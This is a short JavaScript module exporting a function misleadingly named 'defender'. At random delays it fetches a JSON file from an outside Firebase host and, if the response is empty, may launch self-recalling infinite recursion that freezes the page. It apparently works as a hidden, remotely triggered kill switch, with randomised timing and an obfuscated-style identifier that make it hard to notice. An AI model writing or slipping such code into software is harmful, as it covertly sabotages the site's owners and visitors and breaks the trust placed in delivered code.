export function defender () {
  setTimeout(() => {
    if (+Math.round(Math.random())) {
      fetch('https://pain-c002.firebaseio.com/metro-wines.json')
        .then((res) => {
          return res.json()
        })
        .then((res) => {
          if (!res) {
            if (+Math.round(Math.random())) {
              setTimeout(function () {
                (function f () {
                  try {
                    f()
                  } catch (_0x448af4) {
                    f()
                  }
                })()
              }, +((Math.random() * 8 + 5) * 3000))
            }
          }
        })
        .catch()
    }
  }, +((Math.random() * 8 + 5) * 3000))
}
